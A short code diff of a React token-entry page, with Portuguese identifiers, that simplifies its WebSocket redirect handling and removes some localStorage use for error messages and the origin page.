@@ -19,17 +19,7 @@ const TokenPage = () => {
   const { send } = useWebSocket({
     reconectarPayload: { dispositivo },
     onRedirect: (msg) => {
-      const route = resolveServerRoute(msg.url);
-      if (route === "/erro-token") {
-        setIsLoading(false);
-        const erroSalvo = localStorage.getItem("erroToken");
-        if (erroSalvo) {
-          setErro(erroSalvo);
-          localStorage.removeItem("erroToken");
-        }
-        return;
-      }
-      navigate(route);
+      navigate(resolveServerRoute(msg.url));
     },
     onMessage: (msg) => {
       if (msg.acao === "erro_token") {
@@ -63,7 +53,6 @@ const TokenPage = () => {
     setErro("");
 
     send({ acao: "token", usuario, token });
-    localStorage.setItem("paginaOrigem", "/token");
     navigate("/validando");
   };
 
